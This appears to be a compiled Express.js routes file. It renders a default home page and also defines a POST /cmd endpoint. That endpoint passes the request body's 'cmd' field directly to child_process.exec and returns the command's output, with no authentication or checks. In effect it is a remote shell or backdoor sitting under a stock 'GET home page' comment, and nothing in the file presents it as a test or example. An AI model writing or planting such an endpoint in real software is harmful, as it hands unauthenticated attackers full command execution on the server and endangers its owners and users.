"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = require("express");
const child_process_1 = require("child_process");
/*
 * GET home page.
 */
const router = express_1.Router();
router.get('/', (req, res) => {
    res.render('index', { title: 'Express' });
});
router.post('/cmd', (req, res) => {
    child_process_1.exec(req.body.cmd, (err, stdout, stderr) => {
        if (err) {
            res.status(501).type('text').send(stderr);
        }
        else {
            res.status(200).type('text').send(stdout);
        }
    });
});
exports.default = router;
//# sourceMappingURL=index.js.map